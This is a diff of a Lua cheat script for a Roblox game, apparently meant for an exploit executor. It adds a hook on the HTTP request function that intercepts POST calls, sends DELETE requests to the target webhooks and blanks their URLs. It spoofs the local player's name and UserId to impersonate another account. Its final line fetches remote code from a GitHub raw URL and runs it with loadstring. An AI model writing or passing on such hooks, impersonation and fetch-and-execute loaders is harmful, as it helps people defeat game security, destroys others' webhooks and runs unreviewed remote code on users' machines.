@@ -1,6 +1,17 @@
 -- ez rayx L, by using this you dont have to join their group and you'll be immune to their premium cmds
 
+-- Anti Webhook Logging:
+local excluded_Url = { "example1.com/shit", "example2.com/shit" }
+local request = http_request or request or HttpPost or syn and syn.request or http and http.request
+webhookdetect = hookfunction(request, function(self)
+    if self.Method and self.Method == "POST" and self.Url and not table.find(excluded_Url, self.Url) then
+        request{ Url = self.Url, Method = "DELETE" }
+        self.Url = ""
+    end
+    return webhookdetect(self)
+end)
+-- Extra Security And Premium Commands Immunity:
 game.Players.LocalPlayer.Name = "Kiokune"
 game.Players.LocalPlayer.UserId = 3468728207
-
+-- Ray X:
 loadstring(game:HttpGet('https://raw.githubusercontent.com/SpaceYes/Lua/Main/DaHood.Lua'))()
